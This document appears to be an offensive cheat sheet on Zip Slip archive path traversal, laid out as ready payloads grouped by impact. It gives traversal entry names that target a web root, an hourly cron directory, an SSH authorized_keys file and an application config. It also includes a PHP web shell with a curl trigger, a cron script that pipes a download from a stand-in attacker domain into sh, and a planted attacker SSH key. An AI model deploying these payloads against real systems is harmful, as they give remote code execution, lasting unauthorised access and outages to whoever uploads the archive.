# Zip Slip

## Table of Contents
- [RCE](#rce)
- [Persistent Access](#persistent-access)
- [Denial of Service](#denial-of-service)

## RCE

### Arbitrary commands can be executed with the privileges of the extracting process. [^1]

- Writing a web shell into the served directory
    1. Entry name inside the archive
        ```
        ../../../../var/www/html/shell.php
        ```

    2. Extracted file
        ```php
        <?php system($_GET['cmd']); ?>
        ```

    ```bash
    curl https://[VULNERABLE-SERVICE]/shell.php?cmd=whoami
    ```

- Overwriting a script the service already runs
    1. Entry name inside the archive
        ```
        ../../../../etc/cron.hourly/logrotate
        ```

    2. Extracted file
        ```bash
        #!/bin/sh
        curl -s https://[ATTACKER-DOMAIN]/payload.sh | sh
        ```

    The file runs on its next scheduled execution, so no further interaction with the service is needed.

## Persistent Access

### Access can be established that outlives the uploaded archive and survives a restart of the service.

- Adding an authorized SSH key
    1. Entry name inside the archive
        ```
        ../../../../home/user/.ssh/authorized_keys
        ```

    2. Extracted file
        ```
        ssh-ed25519 AAAA[ATTACKER-PUBLIC-KEY] attacker@[ATTACKER-DOMAIN]
        ```

    Deleting the uploaded archive and patching the extraction routine do not remove the key.

## Denial of Service

### A file the service depends on is replaced on disk, so the outage continues until it is restored rather than ending with a restart.

- Overwriting a file required at startup
    1. Entry name inside the archive
        ```
        ../../../../app/config/database.yml
        ```

    2. Result
        The original file is replaced by the archive's content. The service fails to start, and restarting it does not help because the damage is on disk.

[^1]: Requires the extracting process to hold write permission on the target path. The web shell case additionally requires the destination to be served and its extension to be executed by the service.
